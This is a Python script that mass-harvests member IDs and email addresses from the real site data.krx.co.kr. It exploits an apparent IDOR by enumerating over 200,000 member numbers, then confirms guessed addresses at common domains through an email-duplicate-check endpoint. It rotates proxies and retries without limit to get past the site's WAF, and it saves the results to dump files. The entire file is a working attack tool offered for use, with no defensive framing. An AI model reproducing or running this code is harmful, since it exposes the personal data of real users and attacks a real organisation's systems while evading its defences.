#!/usr/bin/env python3
"""data.krx.co.kr member email dump: IDOR mbrNo -> MBR_ID -> isDupMbrEmail.

WAF/HTML/redirect is never treated as an empty member. Those responses retry
on another proxy until a real JSON body with block1 is seen.
"""
from __future__ import annotations

import csv
import json
import os
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any

import requests

BASE = "https://data.krx.co.kr"
IDOR = BASE + "/comm/bldAttendant/getJsonData.cmd"
DUP = BASE + "/contents/MDC/COMS/client/isDupMbrEmail.cmd"
DOMS = ["naver.com", "gmail.com", "hanmail.net", "daum.net", "kakao.com", "krx.co.kr"]
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
START = int(os.environ.get("KRX_START", "2000005000"))
END = int(os.environ.get("KRX_END", "2000222667"))
WORKERS = int(os.environ.get("KRX_WORKERS", "6"))
OUTDIR = os.environ.get("KRX_OUT", "/data/recon/data.krx.co.kr/dump")
PANDA = os.environ.get("KRX_PANDA_URL", "").strip()
STATIC_PROXY = os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or ""

_lock = threading.Lock()
_stats = {
    "done": 0,
    "ids": 0,
    "emails": 0,
    "err": 0,
    "retry": 0,
    "t0": time.time(),
}


class ProxyPool:
    def __init__(self, panda_url: str, static_proxy: str) -> None:
        self.panda_url = panda_url
        self.static = static_proxy.rstrip("/")
        self.proxies: list[str] = []
        self.bad: set[str] = set()
        self.last_fetch = 0.0
        self.i = 0
        if static_proxy and not panda_url:
            self.proxies = [self.static]

    def _normalize(self, line: str) -> str | None:
        line = line.strip()
        if not line or "code" in line.lower() and "invalid" in line.lower():
            return None
        if line.startswith("{"):
            return None
        if "://" not in line:
            line = "http://" + line
        return line

    def fetch(self) -> None:
        if not self.panda_url:
            return
        wait = 1.2 - (time.time() - self.last_fetch)
        if wait > 0:
            time.sleep(wait)
        url = self.panda_url
        # keep caller count; just ensure txt + http
        try:
            r = requests.get(url, timeout=15)
            self.last_fetch = time.time()
            lines = [self._normalize(x) for x in r.text.splitlines()]
            got = [x for x in lines if x]
        except Exception:
            self.last_fetch = time.time()
            got = []
        if got:
            self.proxies = got
            self.bad.clear()
            print(f"proxy_pool {len(got)} {got}", flush=True)
        elif not self.proxies and self.static:
            self.proxies = [self.static]

    def pick(self) -> str | None:
        with _lock:
            live = [p for p in self.proxies if p not in self.bad]
            if not live:
                pass
            else:
                self.i += 1
                return live[self.i % len(live)]
        self.fetch()
        with _lock:
            live = [p for p in self.proxies if p not in self.bad] or list(self.proxies)
            if not live:
                return self.static or None
            self.i += 1
            return live[self.i % len(live)]

    def fail(self, proxy: str | None) -> None:
        if not proxy:
            return
        with _lock:
            self.bad.add(proxy)
            _stats["retry"] += 1
            live = [p for p in self.proxies if p not in self.bad]
        if len(live) <= 1:
            self.fetch()


POOL = ProxyPool(PANDA, STATIC_PROXY)


def is_waf(resp: requests.Response) -> bool:
    if resp.status_code != 200:
        return True
    head = resp.text[:800]
    if head.lstrip().startswith("<"):
        return True
    if any(
        s in head
        for s in (
            "에러페이지",
            "Access Denied",
            "document has been moved",
            "Access Denied",
            "ERROR: The request could not be satisfied",
        )
    ):
        return True
    return False


def json_body(resp: requests.Response) -> dict[str, Any] | None:
    if is_waf(resp):
        return None
    try:
        data = resp.json()
    except Exception:
        return None
    if not isinstance(data, dict):
        return None
    return data


def session_for(proxy: str | None) -> requests.Session:
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"})
    s.mount("https://", requests.adapters.HTTPAdapter(pool_connections=2, pool_maxsize=2, max_retries=0))
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    return s


def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
    """Retry forever until JSON containing `need` is returned."""
    backoff = 1.0
    while True:
        proxy = POOL.pick()
        s = session_for(proxy)
        try:
            r = s.post(
                url,
                data=data,
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=18,
            )
            body = json_body(r)
            if body is not None and need in body:
                return body
        except Exception:
            pass
        POOL.fail(proxy)
        time.sleep(backoff + random.random())
        backoff = min(backoff * 1.4, 8.0)


def mbr_id(mno: int) -> str | None:
    body = post_ok(
        IDOR,
        {"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(mno)},
        "block1",
    )
    block = body.get("block1") or []
    if not block:
        return None
    return block[0].get("MBR_ID")


def dup_email(mid: str) -> str | None:
    for d in DOMS:
        em = f"{mid}@{d}"
        body = post_ok(DUP, {"email": em}, "isDupMbrEmail")
        val = body.get("isDupMbrEmail")
        if val is True or str(val).lower() == "true":
            return em
    return None


def one(mno: int) -> tuple[int, str | None, str | None]:
    while True:
        try:
            mid = mbr_id(mno)
            if not mid:
                return mno, None, None
            return mno, mid, dup_email(mid)
        except Exception:
            with _lock:
                _stats["err"] += 1
            time.sleep(2)


def load_done(path: str) -> set[int]:
    seen: set[int] = set()
    if not os.path.exists(path):
        return seen
    with open(path, newline="", encoding="utf-8") as f:
        for row in csv.reader(f):
            if not row or row[0] in {"mbrNo", "mno"}:
                continue
            try:
                seen.add(int(row[0]))
            except ValueError:
                continue
    return seen


def main() -> None:
    os.makedirs(OUTDIR, exist_ok=True)
    state_path = os.path.join(OUTDIR, "state.json")
    scanned_path = os.path.join(OUTDIR, "scanned.csv")
    email_path = os.path.join(OUTDIR, "emails.csv")
    id_path = os.path.join(OUTDIR, "ids.csv")

    # Confirmed numbers (empty or found). Never skip a hole that was only WAF.
    seen = load_done(scanned_path)
    seen |= load_done(id_path)

    start = START
    email_new = not os.path.exists(email_path)
    id_new = not os.path.exists(id_path)
    scan_new = not os.path.exists(scanned_path)

    ef = open(email_path, "a", newline="", encoding="utf-8")
    idf = open(id_path, "a", newline="", encoding="utf-8")
    sf = open(scanned_path, "a", newline="", encoding="utf-8")
    ew, iw, sw = csv.writer(ef), csv.writer(idf), csv.writer(sf)
    if email_new:
        ew.writerow(["mbrNo", "mbrId", "email"])
    if id_new:
        iw.writerow(["mbrNo", "mbrId"])
    if scan_new:
        sw.writerow(["mbrNo", "status", "mbrId"])

    if PANDA:
        POOL.fetch()

    todo = [n for n in range(start, END + 1) if n not in seen]
    total = len(todo)
    print(
        f"range {start}-{END} workers={WORKERS} remaining={total} "
        f"skip_seen={len(seen)} panda={bool(PANDA)}",
        flush=True,
    )
    last_flush = time.time()
    confirmed_max = start - 1

    def handle(mno: int, mid: str | None, em: str | None) -> None:
        nonlocal last_flush, confirmed_max
        with _lock:
            _stats["done"] += 1
            sw.writerow([mno, "id" if mid else "empty", mid or ""])
            if mid:
                _stats["ids"] += 1
                iw.writerow([mno, mid])
            if em:
                _stats["emails"] += 1
                ew.writerow([mno, mid, em])
            confirmed_max = max(confirmed_max, mno)
            done = _stats["done"]
            if time.time() - last_flush > 5:
                ef.flush()
                idf.flush()
                sf.flush()
                elapsed = max(time.time() - _stats["t0"], 0.001)
                rate = done / elapsed
                remain = total - done
                eta = remain / rate if rate else 0
                json.dump(
                    {
                        "next": confirmed_max + 1,
                        "done": done,
                        "ids": _stats["ids"],
                        "emails": _stats["emails"],
                        "err": _stats["err"],
                        "retry": _stats["retry"],
                        "rate_per_s": round(rate, 2),
                        "eta_min": round(eta / 60, 1),
                    },
                    open(state_path, "w"),
                )
                print(
                    f"done={done}/{total} ids={_stats['ids']} emails={_stats['emails']} "
                    f"retry={_stats['retry']} {rate:.1f}/s eta={eta/60:.1f}min last={mno}",
                    flush=True,
                )
                last_flush = time.time()

    chunk = 400
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        i = 0
        while i < len(todo):
            batch = todo[i : i + chunk]
            futs = [ex.submit(one, x) for x in batch]
            for fut in as_completed(futs):
                mno, mid, em = fut.result()
                handle(mno, mid, em)
            i += chunk
            json.dump(
                {
                    "next": confirmed_max + 1,
                    "done": _stats["done"],
                    "ids": _stats["ids"],
                    "emails": _stats["emails"],
                    "err": _stats["err"],
                    "retry": _stats["retry"],
                },
                open(state_path, "w"),
            )
    ef.flush()
    idf.flush()
    sf.flush()
    ef.close()
    idf.close()
    sf.close()
    print("FINISHED", _stats, flush=True)


if __name__ == "__main__":
    main()
